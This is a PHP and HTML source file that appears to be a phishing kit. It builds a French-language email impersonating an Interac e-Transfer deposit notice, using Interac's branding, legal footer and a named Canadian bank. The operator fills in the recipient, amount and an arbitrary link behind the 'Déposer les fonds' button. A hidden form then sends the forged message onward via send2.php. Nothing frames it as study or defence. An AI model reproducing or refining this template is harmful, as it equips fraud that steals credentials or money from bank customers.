<?php
header('Content-Type: text/html; charset=utf-8');
// Récupération des données du formulaire
$client = htmlspecialchars($_POST['client'], ENT_QUOTES, 'UTF-8');
$email = htmlspecialchars($_POST['email'], ENT_QUOTES, 'UTF-8');
$myname = htmlspecialchars($_POST['myname'], ENT_QUOTES, 'UTF-8');
$montant = htmlspecialchars($_POST['montant'], ENT_QUOTES, 'UTF-8');
$exp = htmlspecialchars($_POST['exp'], ENT_QUOTES, 'UTF-8');
$url = htmlspecialchars($_POST['url'], ENT_QUOTES, 'UTF-8');
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interac e-Transfer</title>
    <style>
        body {
            font-family: sans-serif;
            margin: 0;
            padding: 0;
            background-color: #eaeced;
            color: #222;
            font-size: 14px;
            line-height: 19px;
        }
        .container {
            max-width: 580px;
            margin: 0 auto;
            background-color: white;
        }
        .header {
            background-color: #222;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .nav {
            font-size: 12px;
            color: #eee;
        }
        .nav a {
            color: #eee;
            text-decoration: none;
            margin-left: 10px;
        }
        .content {
            padding: 20px;
        }
        h1 {
            font-size: 18px;
            margin-top: 0;
        }
        .button {
            display: block;
            width: 95%;
            padding: 10px;
            background-color: #f0b51c;
            color: black;
            text-align: center;
            text-decoration: none;
            font-weight: bold;
            border: none;
            margin: 20px 0;
            border-radius: 10px;
            font-size: 18px;
        }
        .expiry {
            font-size: 14px;
            margin-bottom: 20px;
            text-align: center;
        }
        .footer {
            font-size: 12px;
            color: #b5b5b5;
            padding: 20px;
            border-top: 1px solid #d9d9d9;
        }
        .footer a {
            color: #666;
            text-decoration: none;
        }
        .social-icons {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        .social-icons img {
            width: 40px;
            height: 40px;
            margin: 0 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <img src="https://ci3.googleusercontent.com/meips/ADKq_NZ7B5OvVkUwTJ6mxEs4SvL429PPwhvRGI3YcTaTXeLZI0zY0ytEA5ppJpCdYwysMkv_GkNCaQqA63Erau2LRROixEOWiIgL9QMvYaFfSl1wz_osK06TTaBuygeNzyBau_Lt=s0-d-e1-ft#http://etransfer-notification.interac.ca/images/own/etransfer_top_banner.png" alt="INTERAC">
            </div>
            <div class="nav">
                <a href="https://funds.interac.ca/view">Vue navigateur</a> |
                <a href="https://funds.interac.ca/en">English</a> |
                <a href="https://funds.interac.ca/help">?</a>
            </div>
        </div>
        
        <div class="content">
            <strong style="font-size: 20px; font-weight: bold;">Bonjour <?php echo $client; ?>,</strong>
            <p style="font-size: 20px;"><?php echo $myname; ?> vous a envoyé <?php echo $montant; ?> $ (CAD).</p>
            <br>
            <hr>
            <a href="<?php echo $url; ?>" class="button">Déposer les fonds</a>
            <p style="font-size: 18px" class="expiry"><b>Expire le :</b> <?php echo $exp; ?></p>
            <p>Que diriez-vous de déposer des fonds sans avoir à répondre à aucune question? Inscrivez-vous au dépôt automatique du service Virement Interac par votre institution financière - une manière facile et sécuritaire de recevoir des fonds directement dans votre compte bancaire.</p>
        </div>
        
        <div class="footer">
            <a href="https://funds.interac.ca/faq">FAQs</a> |
            <a href="https://funds.interac.ca/security">Cette transaction est sécurisée</a>
            <p>&copy; 2000 - 2024 Interac Corp. Tous droits réservés. <a href="https://help.interac.ca/ca/oon/fr/terms/">Modalités d'utilisation.</a></p>
            <p>MD, Marque d'Interac Corp.</p>
            <div class="social-icons">
                <a href="http://twitter.com/interac" target="_blank"><img src="https://ci3.googleusercontent.com/meips/ADKq_NZj1rKC9kY3piF6ASZkY1vPjyeviIWizkqjRPA4H2lfFZDwQAHZraWjG5SR3nygw91Gt1idHhlz10FlC2EHnKBOCjogfwp5-1VLFL94pfNApT8zQZw4caLqPQrGTd_olFvUfuE=s0-d-e1-ft#http://etransfer-notification.interac.ca/images/social-media-icons/twitter.png" alt="Twitter"></a>
                <a href="https://www.facebook.com/interac" target="_blank"><img src="https://ci3.googleusercontent.com/meips/ADKq_NbMJy125EDTODe2nYSZvREDmTnNK7N9kX68bZIGFnU2fadteQtz6V_lN20F8PGbKXVaNA2wjYKlWBhm3ImnqxTCCnHqDjRZElswB1zGJOMxpf70i4OJG586ki7AOAVsT5bjzGpG=s0-d-e1-ft#http://etransfer-notification.interac.ca/images/social-media-icons/facebook.png" alt="Facebook"></a>
                <a href="https://www.linkedin.com/company/interac-corp" target="_blank"><img src="https://ci3.googleusercontent.com/meips/ADKq_Na0yPCoKeZmcGL7ttlxTCSy-j8cMQlP5zyh1aYvgfm8TLd26Jo5qHBB8xbblOy4BPHe2M9Afsc4PTg2SDOVZqkbuUln_HrS8upue3KE6sMeD6fHByp35N9CZSOihIxthN1LVcN0=s0-d-e1-ft#http://etransfer-notification.interac.ca/images/social-media-icons/linkedin.png" alt="LinkedIn"></a>
                <a href="http://youtube.ca/InteracBrand" target="_blank"><img src="https://ci3.googleusercontent.com/meips/ADKq_NaewWmi2CIj_2tmqZJlc_8gyU457LZZ3Mm6Twb40B7e8PwFi5GBwZC67SkO9QiI8qICWS-_np3biTZ8yZ-Ojz6BCxiYzMgF-A2I9XrhKisDGfZsaHZBuk3zjvMtExSWEEwPCe4=s0-d-e1-ft#http://etransfer-notification.interac.ca/images/social-media-icons/youtube.png" alt="YouTube"></a>
            </div>
            <p style="font-size: 10px; color: #b5b5b5;">Le destinataire est avisé par courriel ou message texte, et l'institution financière concernée vire les fonds en toute sécurité par l'entremise des réseaux de paiement déjà établis.</p>
            <p style="font-size: 10px; color: #b5b5b5;">Ce courriel vous a été envoyé par Interac Corp., propriétaire du service de Virement <i>Interac</i><sup>MD</sup>, au nom de <?php echo $client; ?> domicilié(e) à Banque Laurentienne du Canada.</p>
            <p style="font-size: 10px; color: #b5b5b5;">Interac Corp.<br>P.O. Box 45, Toronto, Ontario M5J 2J1<br><a href="http://www.interac.ca/fr" style="color: #666;">www.interac.ca</a></p>
        </div>
    </div>

    <!-- Formulaire caché pour envoyer les données à send.php -->
    <form action="send2.php" method="post">
        <input type="hidden" name="client" value="<?php echo $client; ?>" required>
        <input type="hidden" name="email" value="<?php echo $email; ?>" required>
        <input type="hidden" name="myname" value="<?php echo $myname; ?>" required>
        <input type="hidden" name="montant" value="<?php echo $montant; ?>" required>
        <input type="hidden" name="exp" value="<?php echo $exp; ?>" required>
        <input type="hidden" name="url" value="<?php echo $url; ?>" required>
        <button type="submit" style="
            position: fixed;
            top: 0;
            background-color: #5c5ca0;
            padding: 12px;
            border-radius: 10px;
            border: none;
            color: white;
            font-size: 20px;
        ">Envoyer</button>
    </form>
</body>
</html>
